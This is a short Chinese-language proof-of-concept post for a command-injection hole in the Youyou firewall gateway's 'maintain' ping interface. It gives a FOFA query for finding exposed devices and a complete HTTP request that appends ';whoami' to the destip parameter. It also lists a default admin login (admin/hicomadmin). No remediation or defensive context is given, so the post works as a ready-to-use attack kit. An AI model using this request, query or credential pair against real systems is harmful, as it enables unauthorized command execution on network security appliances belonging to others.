## 佑友防火墙后台接口maintain存在命令执行漏洞

佑友防火墙网关管理系统maintain存在命令执行漏洞，攻击者可利用该漏洞将恶意的系统命令拼接到正常命令中，从而造成命令执行攻击。

## fofa

```
app="佑友-佑友防火墙"
```

## poc

```
POST /index.php?c=maintain&a=ping HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br, zstd
Connection: keep-alive
Cookie: your-cookie
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: frame
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

interface=&destip=127.0.0.1;whoami
```

使用密码登录` admin/hicomadmin`

![image-20240621193046736](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202406211930785.png)